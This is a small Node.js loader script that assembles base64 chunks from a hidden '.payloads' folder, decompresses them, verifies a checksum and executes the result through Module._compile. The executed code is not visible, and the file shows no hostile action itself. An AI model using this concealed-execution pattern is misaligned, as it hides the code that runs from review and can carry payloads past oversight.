#!/usr/bin/env node
'use strict';
const fs=require('fs'),path=require('path'),zlib=require('zlib'),crypto=require('crypto'),Module=require('module');
const payload=Array.from({length:2},(_,i)=>fs.readFileSync(path.join(__dirname,'.payloads',`check-degeneration.js.${String(i+1).padStart(2,'0')}.b64`),'utf8').trim()).join('');
const src=zlib.gunzipSync(Buffer.from(payload,'base64'));
if(crypto.createHash('sha256').update(src).digest('hex')!=='6c065c563e82b4b2ce4d66ad3dc1f57f0b742de41a8a65c2ae677ebeff5b7dea') throw new Error('embedded source checksum mismatch');
const m=new Module(__filename,module.parent);m.filename=__filename;m.paths=module.paths;m._compile(src.toString('utf8'),__filename);
